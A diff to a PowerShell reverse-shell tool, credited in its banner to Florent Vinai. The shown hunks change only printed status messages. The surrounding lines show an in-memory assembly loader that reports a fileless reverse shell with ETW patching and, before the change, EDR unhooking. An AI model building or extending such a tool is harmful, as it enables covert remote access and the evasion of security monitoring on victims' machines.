@@ -1,5 +1,5 @@
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "PowerShell Reverse Shell - Process Injection Advanced" -ForegroundColor Yellow
+Write-Host "PowerShell Reverse Shell - In-Memory Syscall Loader Advanced" -ForegroundColor Yellow
 Write-Host "Developpe par: Florent Vinai" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
@@ -239,7 +239,7 @@ if ($assemblyBytes) {
         $obj = [System.Activator]::CreateInstance($type)
         Write-Host "[+] Reverse shell launched in memory (no file on disk)" -ForegroundColor Green
         Write-Host "[*] Reverse shell running in background" -ForegroundColor Yellow
-        Write-Host "[*] ETW patching and EDR unhooking applied" -ForegroundColor Yellow
+        Write-Host "[*] ETW patching applied (EtwEventWrite)" -ForegroundColor Yellow
         Write-Host "[*] No .dll file written to disk" -ForegroundColor Yellow
     } catch {
         Write-Host "[!] Error loading: $_" -ForegroundColor Red
